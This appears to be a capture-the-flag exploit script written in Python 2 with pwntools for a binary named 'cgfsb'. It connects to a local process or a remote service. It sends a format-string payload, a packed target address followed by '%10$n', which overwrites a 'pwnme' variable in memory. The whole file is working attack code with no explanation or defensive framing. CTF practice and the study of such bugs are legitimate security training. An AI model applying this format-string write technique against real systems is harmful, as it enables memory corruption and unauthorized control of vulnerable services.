from pwn import *

context.log_level = 'debug'
DEBUG = int(sys.argv[1])
pwnme_addr = 0x0804A068
if DEBUG == 1:
    p = process('./cgfsb')
else:
    p = remote('111.198.29.45',46021)
payload1 = 'ABCD'
payload2 = p32(pwnme_addr) + 'aaaa%10$n'
print payload2
p.recvuntil('please tell me your name:\n')
p.sendline(payload1)
p.recvuntil('leave your message please:\n')
p.sendline(payload2)
print p.recv()
print p.recv()
